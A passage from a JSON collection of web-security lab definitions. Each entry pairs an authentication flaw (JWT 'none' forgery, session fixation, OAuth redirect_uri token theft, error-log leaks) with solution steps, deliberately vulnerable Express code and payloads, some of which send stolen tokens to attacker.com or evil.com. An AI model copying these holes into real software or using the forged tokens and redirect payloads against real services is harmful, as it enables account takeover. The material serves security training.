        "Lab Description": "The server trusts JWTs without properly verifying their signature when the algorithm is set to 'none'. The application decodes and accepts tokens without validation. To solve: craft a JWT with admin privileges using 'alg':'none' and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request and extract the Authorization Bearer token.",
          "Decode JWT at jwt.io and inspect the header and payload.",
          "Replace the 'alg' value with 'none' and change 'role' to 'admin' in the payload.",
          "Remove the signature part and reassemble the token using base64-encoded header and payload only.",
          "Send the modified token in Authorization header and access /admin to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "Authorization: Bearer [Modified JWT]",
          "Use jwt.io to craft unsigned JWT manually"
        ]
      },
      {
        "Lab scenario": "Blind session hijacking via verbose error leakage",
        "Lab Description": "The application exposes detailed error logs that include session identifiers when unexpected input is provided. The error handler returns stack traces with sensitive tokens. To solve: force a 500 error, extract another user's session ID from the error, and use it to impersonate them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send malformed input (e.g., null or object) in authenticated parameter to /profile using Postman.",
          "Trigger internal server error and observe verbose stack trace in the response.",
          "Extract session ID or token leaked in the error response (e.g., req.session or cookies).",
          "Use Burp Suite to resend a request to /my-account with the stolen session ID set in Cookie header.",
          "Confirm successful hijack by seeing another user's account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oopsdebug', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/profile', (req, res) => { try { let settings = req.body.settings.theme.toLowerCase(); res.send('Updated'); } catch (err) { res.status(500).send('Internal Error: ' + err.stack); } }); app.get('/my-account', (req, res) => { res.send('Hello ' + req.session.user); }); app.listen(4000, () => console.log('Verbose Logging Lab running'));",
        "payloads": [
          "{ \"settings\": null }",
          "{ \"settings\": {\"theme\": null} }",
          "POST /profile with JSON causing TypeError",
          "Set-Cookie: session=stolen-session-id"
        ]
      },
      {
        "Lab scenario": "JWT signature validation bypass in authorization middleware",
        "Lab Description": "The backend uses a custom JWT verification logic with a flawed secret check. The application uses the token to grant access to protected admin APIs. However, it fails to properly validate the token signature. To solve: craft a tampered JWT that grants admin access and view the protected admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite after logging in.",
          "Decode the token using jwt.io and observe the algorithm used (e.g., HS256).",
          "Modify the payload to `{ \"role\": \"admin\" }` and change algorithm to `none`.",
          "Remove the signature entirely and resend the token via Postman in an Authorization header.",
          "Access /admin/dashboard endpoint and confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; return next(); } try { const verified = jwt.verify(token, secret); req.user = verified; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.get('/admin/dashboard', (req, res) => { if (req.user.role !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass Lab running'));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
          "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"carlos\", \"role\": \"admin\" }"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration allows token reuse from different client",
        "Lab Description": "The OAuth implementation does not validate the client ID or redirect URI properly. The attacker can reuse a legitimate token issued for another application to gain unauthorized access. To solve: obtain a valid OAuth token and use it to impersonate Carlos by accessing the /me endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth flow during your own login to obtain an access token.",
          "Note that the access token is valid across clients due to lack of client_id binding.",
          "Send a request to `/me` with Authorization: Bearer <token> using Postman.",
          "Manipulate the token (if JWT-based) to impersonate Carlos or replay the same token.",
          "Confirm that the endpoint returns Carlosâ€™s data to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'legit-token-123': { username: 'carlos', email: 'carlos@example.com' } }; app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token || !tokens[token]) return res.status(401).send('Invalid or missing token'); req.user = tokens[token]; next(); }); app.get('/me', (req, res) => { res.json({ message: `Hello, ${req.user.username}`, email: req.user.email }); }); app.listen(4000, () => console.log('OAuth Lab running on http://localhost:4000'));",
        "payloads": [
          "Authorization: Bearer legit-token-123",
          "Authorization: Bearer eyJhbGciOi... (if token is JWT-based and predictable)"
        ]
      },
      {
        "Lab scenario": "Session fixation via login token reuse in cookie",
        "Lab Description": "The application accepts a session ID in a GET parameter and reflects it back into a Set-Cookie response during login. It does not regenerate the session on login, enabling session fixation. To solve: force a victim to use a known session ID and take over their session after login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Send a GET request to /login?session=attacker123 using Burp Repeater.",
          "Observe the Set-Cookie header that includes session=attacker123.",
          "Craft a phishing link to /login?session=attacker123 and send to the victim.",
          "Wait for the victim to log in. The session remains fixed.",
          "Use the same session ID (attacker123) in your browserâ€™s cookie and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const session = req.query.session || 'newsession'; res.setHeader('Set-Cookie', `session=${session}`); res.send('<form method=POST>Username: <input name=username><input type=submit></form>'); }); app.post('/login', (req, res) => {  res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') res.send('Access granted to attacker'); else res.send('Generic account page'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "/login?session=attacker123",
          "Set-Cookie: session=attacker123",
          "Cookie: session=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth session fixation in authorization endpoint",
        "Lab Description": "The application improperly handles session tokens during the OAuth authorization flow. It allows pre-setting session cookies before the victim logs in, resulting in a session fixation attack. The application accepts a `session_id` from an attacker-controlled domain. To solve: hijack Carlos's session after they authorize the app and access their account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept an OAuth login request from a legitimate user to identify the session_id cookie flow.",
          "Observe that the session cookie can be pre-set using a crafted GET request with a fixed session_id value.",
          "Craft a malicious OAuth authorization URL with a fixed `session_id` and send it to the victim via a phishing domain.",
          "Once the victim logs in and authorizes the app, reuse the fixed session_id to access the victimâ€™s authenticated session.",
          "Visit /my-account using the hijacked session to confirm the exploit."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth', (req, res) => { const { session_id, redirect_uri } = req.query; if (session_id) { res.cookie('session_id', session_id); } res.redirect(redirect_uri); }); app.get('/callback', (req, res) => { const user = { username: 'carlos' }; sessions[req.cookies.session_id] = user; res.send('Authorization complete.'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session_id]; if (user) return res.send(`Account page of ${user.username}`); return res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "https://target.com/auth?session_id=abc123&redirect_uri=https://target.com/callback",
          "Cookie: session_id=abc123",
          "GET /my-account HTTP/1.1"
        ]
      },
      {
        "Lab scenario": "JWT tampering using 'none' algorithm",
        "Lab Description": "The app uses JWT tokens to manage sessions but does not validate the algorithm specified in the header. It trusts tokens signed with 'none', allowing attackers to forge valid tokens. To solve: forge a JWT for the user 'carlos' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite after logging in.",
          "Decode the JWT using jwt.io or Postman and observe the algorithm field in the header (e.g., 'HS256').",
          "Modify the header to use 'alg':'none' and payload to impersonate 'carlos'. Remove the signature part.",
          "Use Burp or Postman to send the forged JWT in the Authorization header.",
          "Access /dashboard and confirm Carlosâ€™s user context to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${user.username} (unauthenticated)`); } try { const verified = jwt.verify(token, 'secret'); return res.send(`Welcome ${verified.username}`); } catch { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "Authorization: Bearer <forged-token>",
          "GET /dashboard HTTP/1.1"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect and token leakage",
        "Lab Description": "The OAuth integration with a third-party identity provider allows open redirect URLs and token leakage via the redirect_uri parameter. The app does not validate the redirect URI properly, allowing attackers to intercept tokens. To solve: capture an OAuth access token belonging to Carlos and use it to access his protected resource.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Launch the OAuth login flow with Burp and observe the redirect_uri used in the request.",
          "Identify that the app does not validate redirect_uri domains against a whitelist.",
          "Set up a listener (e.g., via RequestBin or Postman Echo) and craft a login URL with your malicious redirect_uri.",
          "Send the malicious login link to Carlos. When Carlos logs in, the token is leaked to your server.",
          "Replay the stolen token in a request to the resource server and access Carlosâ€™s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/login', (req, res) => { const { redirect_uri } = req.query; const token = 'access-token-for-carlos'; res.redirect(`${redirect_uri}#token=${token}`); }); app.get('/resource', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Carlosâ€™s sensitive data'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
        "payloads": [
          "https://target.com/oauth/login?redirect_uri=https://attacker.com/capture",
          "https://attacker.com/capture#token=access-token-for-carlos",
          "Authorization: Bearer access-token-for-carlos"
        ]
      },
      {
        "Lab scenario": "Cookie-based session fixation vulnerability in login flow",
        "Lab Description": "The application implements session handling using a fixed session ID stored in a cookie, but it fails to regenerate the session ID upon successful login. The application reuses the session cookie across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing their session ID pre-login and accessing their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request before login and observe the 'sessionId' cookie being set.",
          "2. Send a crafted phishing link to the victim that includes a fixed sessionId in the cookie header.",
          "3. Victim logs in using the malicious link; their session is now authenticated using the attacker's fixed sessionId.",
          "4. Use the same sessionId in your browser to access authenticated resources as Carlos.",
          "5. Visit /my-account endpoint to verify successful session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionId = req.cookies.sessionId; sessions[sessionId] = { user: username }; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionId]; if (session) { res.send(`Welcome, ${session.user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "Set-Cookie: sessionId=attacker123",
          "Crafted phishing URL with fixed cookie",
          "Use same sessionId post-login to access /my-account"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in authorization header",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session validation but fails to validate the algorithm field properly. It accepts tokens signed with 'none' algorithm, allowing attackers to forge tokens without a valid signature. To solve: forge a JWT to impersonate Carlos and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in and capture the JWT token from the Authorization header using Burp Suite.",
          "2. Decode the JWT header and payload using jwt.io.",
          "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}.",
          "4. Remove the signature and encode the new token.",
          "5. Use Postman to send a request to /profile with the modified JWT in the Authorization header to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret); res.json({ token }); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const { username } = decoded.payload; return res.send(`Welcome ${username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Tampering Lab running on http://localhost:4000'));",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\"}",
          "Modified JWT: [base64(header)].[base64(payload)]."
        ]
      },
      {
        "Lab scenario": "OAuth open redirect vulnerability in redirect_uri parameter",
        "Lab Description": "The application integrates with a third-party OAuth provider for login but does not validate the 'redirect_uri' parameter. An attacker can manipulate the redirect URL to leak the access token to their domain. To solve: steal Carlos's OAuth token by crafting a malicious redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to inspect the OAuth flow, specifically the 'redirect_uri' parameter in the /authorize request.",
          "2. Craft a malicious URL like /oauth/authorize?redirect_uri=https://attacker.com/callback.",
          "3. Send the malicious URL to Carlos as a phishing link.",
          "4. When Carlos clicks the link and authenticates, the access token is redirected to attacker's domain.",
          "5. Use the stolen token in Postman to access the /my-account endpoint as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abcd1234' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = tokens[user];  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abcd1234') res.send('Welcome Carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
        "payloads": [
          "https://victim.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
          "#access_token=abcd1234",
          "Authorization: Bearer abcd1234"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token in login URL",
        "Lab Description": "The application uses a session token passed via the URL. It fails to invalidate pre-authentication tokens during login. This allows attackers to fix a session and hijack it post-login. The application maintains the same session identifier before and after successful authentication. To solve: Hijack Carlos's session after forcing him to log in with a fixed token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login?session=abc123 request made before login and note the token.",
          "2. Register a new user and confirm that the token remains the same before and after login.",
          "3. Craft a phishing link with ?session=abc123 and send it to Carlos.",
          "4. After Carlos logs in via the phishing link, the session will be authenticated and bound to token abc123.",
          "5. Use the same token to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.sessionID = req.query.session || req.sessionID; res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { req.session.user = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send('Account details for ' + req.session.user); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "GET /login?session=abc123",
          "POST /login with session=abc123 cookie",
          "GET /my-account with session=abc123 cookie"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass using 'none' algorithm",
        "Lab Description": "The application uses a JSON Web Token (JWT) to manage sessions. It accepts tokens signed with the 'none' algorithm and skips signature verification, allowing attackers to forge tokens. To solve: Modify a JWT to impersonate the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman or Burp Suite to intercept the Authorization: Bearer <JWT> header after login.",
          "2. Decode the JWT using jwt.io or any local JWT tool.",
          "3. Replace the payload with {\"username\": \"admin\"} and set alg to 'none' in the header.",
          "4. Remove the signature section from the JWT.",
          "5. Send the modified token as Authorization: Bearer <forged JWT> and access /admin."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, secret); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { jwt.verify(token, secret); return res.send('Valid JWT'); } } catch (e) { return res.status(403).send('Forbidden'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\": \"none\"}",
          "Payload: {\"username\": \"admin\"}",
          "Final JWT: <base64(header)>.<base64(payload)>."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
        "Lab Description": "The application integrates with a third-party OAuth provider. It fails to validate the redirect_uri strictly, allowing attackers to inject their own malicious redirect. The attacker can steal the authorization code and redeem it for an access token. To solve: Hijack the OAuth flow and log in as the victim user.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate the OAuth login and intercept the redirect_uri parameter using Burp Suite.",
          "2. Modify the redirect_uri to a malicious URL you control, e.g., https://evil.com/callback.",
          "3. Send the manipulated URL to the victim (Carlos) to click and log in.",
          "4. On your evil server, capture the authorization code sent as a query parameter.",
          "5. Exchange the stolen code using Postman for an access token and call /userinfo to validate login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') res.send('Login successful via OAuth'); else res.status(400).send('Invalid'); }); app.listen(5000);",
        "payloads": [
          "https://target.com/auth?redirect_uri=https://evil.com/callback",
          "https://evil.com/callback?code=fake-auth-code",
          "POST /token with code=fake-auth-code",
          "GET /userinfo with Bearer token"
        ]
      },
      {
        "Lab scenario": "Persistent Session Fixation in Login Flow",
        "Lab Description": "This lab demonstrates a session fixation vulnerability within the authentication process. The application maintains the same session ID across unauthenticated and authenticated states. To solve: hijack Carlos's session by fixing a known session ID prior to login, then access his My Account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the unauthenticated session and observe the Set-Cookie header.",
          "Send a phishing link to Carlos embedding a fixed session ID using the session cookie manually set in the browser.",
          "After Carlos logs in using that session, hijack the session ID (from logs or capture).",
          "Replay the fixed session cookie in your browser to gain access to his authenticated session.",
          "Visit /my-account to verify access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: '1234' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionID; sessions[sid] = username; return res.send('Logged in'); } return res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionID; if (sessions[sid]) return res.send('Account of ' + sessions[sid]); res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('Lab running'));",
        "payloads": [
          "GET /login with Cookie: sessionID=attackersession",
          "Send phishing link with: document.cookie = \"sessionID=attackersession\"",
          "Replay stolen cookie after login: Cookie: sessionID=attackersession"
        ]
      },
      {
        "Lab scenario": "JWT tampering with 'none' algorithm exploit",
        "Lab Description": "This lab uses JWT for session management but does not properly enforce signature verification. The server accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge an unsigned JWT with the username 'carlos' and access his My Account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the login request and extract the JWT from the Authorization header.",
          "Decode the token using jwt.io and observe the 'alg' field in the header.",
          "Craft a new token with alg=none and payload {\"username\":\"carlos\"}, removing the signature.",
          "Send the forged token via Postman in the Authorization: Bearer header.",
          "Visit /my-account to verify successful access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch { return res.status(401).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab Running'));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: <base64(header)>.<base64(payload)>.",
          "Authorization: Bearer <forged-jwt>"
        ]
      },
      {
        "Lab scenario": "OAuth Redirect URI Manipulation",
        "Lab Description": "This lab uses OAuth 2.0 for third-party login. The application fails to validate the redirect_uri properly. This allows redirection to an attacker-controlled page after login. To solve: intercept the OAuth flow, modify the redirect URI, and capture Carlos's access token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Initiate login using the OAuth provider and intercept the request using Burp Suite.",
          "Modify the 'redirect_uri' parameter to point to your malicious server (e.g. http://evil.com/callback).",
          "Host a listener on your server to capture the authorization code or access token.",
          "Use the stolen token to access the protected API or session endpoint as Carlos.",
          "Verify by accessing /my-account while impersonating Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthConfig = { client_id: 'abc123', client_secret: 'shhh', redirect_uri: '', token_endpoint: 'https://provider.com/token' }; app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const tokenRes = await axios.post(oauthConfig.token_endpoint, { code, redirect_uri, client_id: oauthConfig.client_id, client_secret: oauthConfig.client_secret }); const token = tokenRes.data.access_token; res.send('Token: ' + token); } catch { res.status(500).send('Token exchange failed'); } }); app.listen(5000, () => console.log('OAuth Lab running'));",
        "payloads": [
          "Original URL: /authorize?redirect_uri=https://vulnerable.com/oauth/callback",
          "Malicious: /authorize?redirect_uri=http://attacker.com/callback",
          "Capture: http://attacker.com/callback?access_token=xyz",
          "Replay: Authorization: Bearer xyz"
        ]
      },
      {
        "Lab scenario": "JWT tampering via leaked secret in error logs",
        "Lab Description": "The application uses JWT for session management but leaks the signing secret via verbose error messages. A malformed JWT results in a signed error that reveals the secret. The application accepts manipulated JWTs if they are correctly signed. To solve: Forge an admin JWT token and access the /admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to send a tampered JWT in the Authorization header to /profile.",
          "2. Observe server error response in JSON; look for stack trace or 'JsonWebTokenError' with secret details.",
          "3. Extract the secret key and use jwt.io to craft a new token with payload {\"username\":\"admin\",\"role\":\"admin\"}.",
          "4. Sign it using the disclosed secret and use Burp Suite to replace the old token in an authenticated request.",
          "5. Send a GET request to /admin and confirm access to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = process.env.JWT_SECRET || 'devsecret'; app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.username }); } catch (err) { res.status(500).json({ error: err.message, stack: err.stack }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.role === 'admin') return res.send('Admin panel'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.<signature_with_leaked_secret>",
          "Authorization: Bearer <forged_JWT_token>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in callback",
        "Lab Description": "The application uses a third-party OAuth provider to log in users. However, the redirect_uri parameter is not strictly validated, allowing attackers to inject their own callback endpoints. This enables account takeover via token theft. To solve: Intercept the OAuth code and use it to access Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth login request to /auth?provider=oauth.",
          "2. Modify the redirect_uri to your malicious server (e.g., https://attacker.com/callback) and forward the request.",
          "3. On your attacker server, capture the authorization code from the callback.",
          "4. Use Postman to exchange the code for an access_token at /auth/token.",
          "5. Replay the token as Authorization: Bearer <token> to /profile and access Carlosâ€™s account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'app123'; const CLIENT_SECRET = 'secret'; const oauthProvider = 'https://oauth.example.com'; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${oauthProvider}/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post(`${oauthProvider}/token`, { form: { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code' } }, (err, r, body) => { const accessToken = JSON.parse(body).access_token; res.send(`Logged in with token: ${accessToken}`); }); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
        "payloads": [
          "https://attacker.com/callback",
          "GET /auth?provider=oauth&redirect_uri=https://attacker.com/callback",
          "Captured code=xyz from attacker-controlled callback",
          "Authorization: Bearer <token>"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login flow",
        "Lab Description": "The application assigns a session ID in a cookie before authentication and does not regenerate it upon login. Attackers can force a known session ID on victims, then log in using that ID themselves. To solve: Fixate a session, force Carlos to use it, and then access his account via the same ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Chrome or Burp to capture a GET /login request and observe session cookie (e.g., sid=xyz123).",
          "2. Use phishing or an open redirect to trick Carlos into authenticating while using that same session ID.",
          "3. Once Carlos logs in, use Burp Suite to access /my-account using the fixed session (sid=xyz123).",
          "4. Confirm that the session is now linked to Carlos's account.",
          "5. Access /my-account to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'fixme', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'mypassword' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Logged in as ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
        "payloads": [
          "Cookie: sid=xyz123 (before login)",
          "GET /login using attacker-controlled sid",
          "GET /my-account using same sid after victim logs in"
        ]
      },
      {
        "Lab scenario": "Tampered JWT leads to admin privilege escalation",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage authentication and access control. The server uses the 'none' algorithm to verify tokens but does not enforce proper signature validation. The application trusts the user-supplied JWT without verifying its integrity. To solve: Modify your own JWT to escalate to the admin role and access the admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a valid login request and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or jwt_tool and inspect its header and payload.",
          "3. Modify the 'alg' field in the JWT header to 'none' and change the 'role' in the payload to 'admin'.",
          "4. Remove the signature portion of the JWT entirely.",
          "5. Use Postman to send a GET request to /admin-dashboard with the modified JWT in the Authorization header to gain access."
        ],
        "Vulnerability name": "Authentication",
